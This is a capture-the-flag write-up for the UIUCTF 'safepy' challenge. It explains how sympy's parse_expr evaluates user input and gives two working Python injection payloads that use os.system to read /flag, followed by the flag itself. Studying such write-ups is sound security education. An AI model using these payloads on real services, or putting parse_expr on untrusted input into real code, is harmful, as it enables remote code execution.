# safepy

Categories: Jail/Python/Beginner

Description:
> safepy
>
> - 50 points
>
> My calculator won't be getting pwned again...
>
> $ `nc safepy.chal.uiuc.tf 1337`
>
> author: tow_nater
>
> [handout.tar.gz](resources/handout.tar.gz)<br/>

**Tags:** python, jail

## Takeaways


## Solution

The source code of the challenge is pretty simple:

```python
from sympy import *

def parse(expr):
    # learned from our mistake... let's be safe now
    # https://stackoverflow.com/questions/33606667/from-string-to-sympy-expression
    # return sympify(expr)

    # https://docs.sympy.org/latest/modules/parsing.html
    return parse_expr(expr)


print('Welcome to the derivative (with respect to x) solver!')
user_input = input('Your expression: ')
expr = parse(user_input)
deriv = diff(expr, Symbol('x'))
print('The derivative of your expression is:')
print(deriv)
```

As we can already see from the links provided above, `parse_expr` uses `eval()` underneath, but let's take also a look our selves:

```python
# ~/.pyenv/versions/3.10.5/lib/python3.10/site-packages/sympy/parsing/sympy_parser.py
def parse_expr(s, local_dict=None, transformations=standard_transformations,
               global_dict=None, evaluate=True):

    # ... #
    code = stringify_expr(s, local_dict, global_dict, transformations) # Converts the string `s` to Python code
    if not evaluate:
        code = compile(evaluateFalse(code), '<string>', 'eval')
    rv = eval_expr(code, local_dict, global_dict)
```

Definitely unsafe. So, our exploit simply is

```python
exec('import os; os.system("cat /flag")')
```

The above payload prints the flag, but raises an exception because `exec` returns `None` and this is not something from which we can calculate a derivative. If we want to further suppress exceptions, we can do:

```python
eval('__builtins__["__import__"]("os").system("cat /flag")')
```

which will return `0` and will be a valid input for calculating the derivative. And thus, we get the flag!

`uiuctf{na1v3_0r_mal1ci0u5_chang3?}`
